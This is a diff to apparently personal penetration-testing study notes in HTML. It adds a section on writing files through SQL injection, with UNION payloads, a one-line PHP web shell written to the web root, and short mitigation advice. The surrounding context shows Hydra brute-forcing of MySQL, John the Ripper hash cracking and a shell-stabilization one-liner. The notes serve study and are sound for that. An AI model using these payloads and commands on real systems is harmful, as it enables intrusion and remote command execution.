@@ -337,7 +337,19 @@ Gathering</a>
 <li><a href="#user-privileges" id="toc-user-privileges"><span class="toc-section-number">1.7.8.7.1</span> User Privileges</a></li>
 <li><a href="#load_file" id="toc-load_file"><span class="toc-section-number">1.7.8.7.2</span> LOAD_FILE</a></li>
 </ul></li>
-<li><a href="#writing-files" id="toc-writing-files"><span class="toc-section-number">1.7.8.8</span> Writing Files</a></li>
+<li><a href="#writing-files" id="toc-writing-files"><span class="toc-section-number">1.7.8.8</span> Writing Files</a>
+<ul>
+<li><a href="#secure_file_priv" id="toc-secure_file_priv"><span class="toc-section-number">1.7.8.8.1</span> secure_file_priv</a></li>
+<li><a href="#select-into-outfile" id="toc-select-into-outfile"><span class="toc-section-number">1.7.8.8.2</span> SELECT INTO OUTFILE</a></li>
+<li><a href="#writing-files-through-sql-injection" id="toc-writing-files-through-sql-injection"><span class="toc-section-number">1.7.8.8.3</span> Writing Files through SQL
+Injection</a></li>
+<li><a href="#writing-a-web-shell-php" id="toc-writing-a-web-shell-php"><span class="toc-section-number">1.7.8.8.4</span> Writing a Web Shell
+(PHP)</a></li>
+</ul></li>
+<li><a href="#mitigating-sql-injection" id="toc-mitigating-sql-injection"><span class="toc-section-number">1.7.8.9</span> Mitigating SQL Injection</a>
+<ul>
+<li><a href="#php" id="toc-php"><span class="toc-section-number">1.7.8.9.1</span> PHP</a></li>
+</ul></li>
 </ul></li>
 <li><a href="#mysql" id="toc-mysql"><span class="toc-section-number">1.7.9</span> MySQL</a>
 <ul>
@@ -1331,6 +1343,45 @@ of the following command.</p>
 <p>Requirements: 1. User with <code>FILE</code> privilege enabled 2.
 MySQL global <code>secure_file_priv</code> variable not enabled 3. Write
 access to the location we want to write to on the back-end server</p>
+<h5 data-number="1.7.8.8.1" id="secure_file_priv"><span class="header-section-number">1.7.8.8.1</span> secure_file_priv</h5>
+<div class="sourceCode" id="cb85"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb85-1"><a href="#cb85-1" aria-hidden="true" tabindex="-1"></a>SHOW VARIABLES <span class="kw">LIKE</span> <span class="st">&#39;secure_file_priv&#39;</span>;</span></code></pre></div>
+<div class="sourceCode" id="cb86"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb86-1"><a href="#cb86-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> variable_name, variable_value <span class="kw">FROM</span> information_schema.global_variables <span class="kw">where</span> variable_name<span class="op">=</span><span class="ot">&quot;secure_file_priv&quot;</span></span></code></pre></div>
+<div class="sourceCode" id="cb87"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb87-1"><a href="#cb87-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- </span></span></code></pre></div>
+<h5 data-number="1.7.8.8.2" id="select-into-outfile"><span class="header-section-number">1.7.8.8.2</span> SELECT INTO OUTFILE</h5>
+<p>Write output from a <code>SELECT</code> query into a file.</p>
+<div class="sourceCode" id="cb88"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb88-1"><a href="#cb88-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">from</span> users <span class="kw">INTO</span> OUTFILE <span class="st">&#39;/tmp/credentials&#39;</span>;</span></code></pre></div>
+<p>Write any string into a file.</p>
+<div class="sourceCode" id="cb89"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb89-1"><a href="#cb89-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="st">&#39;this is a test&#39;</span> <span class="kw">INTO</span> OUTFILE <span class="st">&#39;/tmp/test.txt&#39;</span>;</span></code></pre></div>
+<h5 data-number="1.7.8.8.3" id="writing-files-through-sql-injection"><span class="header-section-number">1.7.8.8.3</span> Writing Files through SQL
+Injection</h5>
+<p>If we want to write a web shell we need to know the base web
+directory. One way to find it out is the <code>load_file</code> function
+which shows us Apache’s configuration, this can be found at
+<code>/etc/apache2/apache2.conf</code>, Nginx’s at
+<code>/etc/nginx/nginx.conf</code> and IIS at
+<code>%WinDir%\System32\Inetsrv\Config\ApplicationHost.config</code>.
+Alternatively, a fuzzing scan would still be possible with <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">this
+wordlist for Linux</a> and <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">this
+wordlist for Windows</a>.</p>
+<p>A <code>UNION</code> injection for poof can look like this:</p>
+<div class="sourceCode" id="cb90"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb90-1"><a href="#cb90-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; union select 1,&#39;</span>file written successfully!<span class="st">&#39;,3,4 into outfile &#39;</span><span class="op">/</span>var<span class="op">/</span>www<span class="op">/</span>html<span class="op">/</span>proof.txt<span class="st">&#39;-- </span></span></code></pre></div>
+<h5 data-number="1.7.8.8.4" id="writing-a-web-shell-php"><span class="header-section-number">1.7.8.8.4</span> Writing a Web Shell
+(PHP)</h5>
+<div class="sourceCode" id="cb91"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb91-1"><a href="#cb91-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span> <span class="fu">system</span>(<span class="va">$_REQUEST</span>[<span class="dv">0</span>])<span class="ot">;</span> <span class="kw">?&gt;</span></span></code></pre></div>
+<p>If we use the <code>PHP</code> code from above and inject it to the
+server, we should have the ability to run commands. When we got to the
+<code>/shell.php</code> file we should be able to pass commands to the
+<code>0</code> parameter with <code>?0=id</code> with the URL.</p>
+<div class="sourceCode" id="cb92"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb92-1"><a href="#cb92-1" aria-hidden="true" tabindex="-1"></a>cn<span class="st">&#39; union select &quot;&quot;,&#39;</span><span class="op">&lt;</span>?php <span class="kw">system</span>($_REQUEST[<span class="dv">0</span>]); ?<span class="op">&gt;</span><span class="st">&#39;, &quot;&quot;, &quot;&quot; into outfile &#39;</span><span class="op">/</span>var<span class="op">/</span>www<span class="op">/</span>html<span class="op">/</span>shell.php<span class="st">&#39;-- </span></span></code></pre></div>
+<h4 data-number="1.7.8.9" id="mitigating-sql-injection"><span class="header-section-number">1.7.8.9</span> Mitigating SQL
+Injection</h4>
+<p>If possible restrict valid characters, give the database user the
+least required permissions, use a <code>WAF</code> and parameterized
+queries.</p>
+<h5 data-number="1.7.8.9.1" id="php"><span class="header-section-number">1.7.8.9.1</span> PHP</h5>
+<p>Use the <a href="https://www.php.net/manual/en/mysqli.real-escape-string.php">mysqli_real_escape_string()</a>or
+the <a href="https://www.php.net/manual/en/function.pg-escape-string.php">pg_escape_string()</a>
+function.</p>
 <h3 data-number="1.7.9" id="mysql"><span class="header-section-number">1.7.9</span> MySQL</h3>
 <p>To ensure that we are working with a <code>MySQL</code> Server we can
 use the following commands.</p>
@@ -1372,7 +1423,7 @@ use the following commands.</p>
 </table>
 <p>First we need a client, which is in our case
 <code>default-mysql-client</code>:</p>
-<div class="sourceCode" id="cb85"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb85-1"><a href="#cb85-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> mysql <span class="at">-h</span> [IP] <span class="at">-P</span> [port] <span class="at">-u</span> [username] <span class="at">-p</span></span></code></pre></div>
+<div class="sourceCode" id="cb93"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb93-1"><a href="#cb93-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> mysql <span class="at">-h</span> [IP] <span class="at">-P</span> [port] <span class="at">-u</span> [username] <span class="at">-p</span></span></code></pre></div>
 <pre class="text"><code>*(-h [IP]        = Connect to the MariaDB server on the given host
   -u [username]  = The MariaDB user name to use when connecting to the server
   -P [port]      = The port to use for the connection
@@ -1386,12 +1437,12 @@ use the following commands.</p>
 <h4 data-number="1.7.9.1" id="cracking-credentials"><span class="header-section-number">1.7.9.1</span> Cracking Credentials</h4>
 <p>If we do not have any credentials we can use <code>Nmap</code> or
 <code>Metasplot</code> to gain this information:</p>
-<div class="sourceCode" id="cb87"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb87-1"><a href="#cb87-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> nmap <span class="at">--script</span><span class="op">=</span>mysql-enum [target]</span></code></pre></div>
+<div class="sourceCode" id="cb95"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb95-1"><a href="#cb95-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> nmap <span class="at">--script</span><span class="op">=</span>mysql-enum [target]</span></code></pre></div>
 <pre class="text"><code>*(--script=mysql-enum           = Scan with a single script: mysql-enum
   [target]                      = The IP address of the target)</code></pre>
 <p>Now that we know some usernames of the database, we can try to crack
 the passwords of them with <code>Hydra</code>:</p>
-<div class="sourceCode" id="cb89"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb89-1"><a href="#cb89-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hydra</span> <span class="at">-t</span> 16 <span class="at">-l</span> root <span class="at">-P</span> /usr/share/wordlists/rockyou.txt <span class="at">-vV</span> 10.10.6.199 mysql</span></code></pre></div>
+<div class="sourceCode" id="cb97"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb97-1"><a href="#cb97-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hydra</span> <span class="at">-t</span> 16 <span class="at">-l</span> root <span class="at">-P</span> /usr/share/wordlists/rockyou.txt <span class="at">-vV</span> 10.10.6.199 mysql</span></code></pre></div>
 <pre class="text"><code>*(-t 16     = Number of parallel connections per target
   -l [user] = Points to the user who&#39;s account you&#39;re trying to compromise
   -P [file] = Points to the file containing the list of possible passwords
@@ -1406,10 +1457,10 @@ following example:</li>
 </ul>
 <pre><code>carl:*EA031893AA21444B170FC2162A56978B8CEECE18</code></pre>
 <p>We can pipe the hash in a file:</p>
-<div class="sourceCode" id="cb92"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb92-1"><a href="#cb92-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> echo carl:<span class="pp">*</span>EA031893AA21444B170FC2162A56978B8CEECE18 <span class="op">&gt;</span> hash.txt</span></code></pre></div>
+<div class="sourceCode" id="cb100"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb100-1"><a href="#cb100-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> echo carl:<span class="pp">*</span>EA031893AA21444B170FC2162A56978B8CEECE18 <span class="op">&gt;</span> hash.txt</span></code></pre></div>
 <p>And crack the password with <code>John the Ripper</code>:</p>
-<div class="sourceCode" id="cb93"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb93-1"><a href="#cb93-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john hash.txt</span>
-<span id="cb93-2"><a href="#cb93-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john <span class="at">--show</span> <span class="at">--format</span><span class="op">=</span>RAW-MD5 hash.txt</span></code></pre></div>
+<div class="sourceCode" id="cb101"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb101-1"><a href="#cb101-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john hash.txt</span>
+<span id="cb101-2"><a href="#cb101-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john <span class="at">--show</span> <span class="at">--format</span><span class="op">=</span>RAW-MD5 hash.txt</span></code></pre></div>
 <pre class="text"><code>*(--show            = show cracked passwords
   --format=&lt;param&gt;  = force hash type: descrypt, bsdicrypt, md5crypt, RAW-MD5, bcrypt, LM, AFS, tripcode, dummy, and crypt</code></pre>
 <h3 data-number="1.7.10" id="hashcat"><span class="header-section-number">1.7.10</span> Hashcat</h3>
@@ -1548,7 +1599,7 @@ source.</p>
   [target]          = The URL of the webpage we want to fetch
   -d [param]        = Sends the specified data in a POST  request  to  the HTTP server)</code></pre>
 <p>We can also save files with the <code>-0</code> flag:</p>
-<div class="sourceCode" id="cb116"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb116-1"><a href="#cb116-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> curl <span class="at">-O</span> inlanefreight.com/index.html <span class="at">-o</span> home.html <span class="at">-s</span> <span class="at">-v</span></span></code></pre></div>
+<div class="sourceCode" id="cb124"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb124-1"><a href="#cb124-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> curl <span class="at">-O</span> inlanefreight.com/index.html <span class="at">-o</span> home.html <span class="at">-s</span> <span class="at">-v</span></span></code></pre></div>
 <pre class="text"><code>*(-0    = Save the output into a file
   -o    = Sepcify the filename
   -s    = Silent the status
@@ -1587,7 +1638,7 @@ Shell</li>
 <h4 data-number="1.8.3.3" id="stabilize-shell"><span class="header-section-number">1.8.3.3</span> Stabilize Shell</h4>
 <p>You can stabilize the shell with the python module
 <code>pty</code>:</p>
-<div class="sourceCode" id="cb123"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb123-1"><a href="#cb123-1" aria-hidden="true" tabindex="-1"></a>python <span class="op">-</span>c <span class="st">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span></span></code></pre></div>
+<div class="sourceCode" id="cb131"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb131-1"><a href="#cb131-1" aria-hidden="true" tabindex="-1"></a>python <span class="op">-</span>c <span class="st">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span></span></code></pre></div>
 <p>For more information checkout the following GitHub repo: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">PayloadsAllTheThings</a></p>
 <p>If you gain access depending on the OS you can try the following
 commands to get more information: &gt;Linux</p>
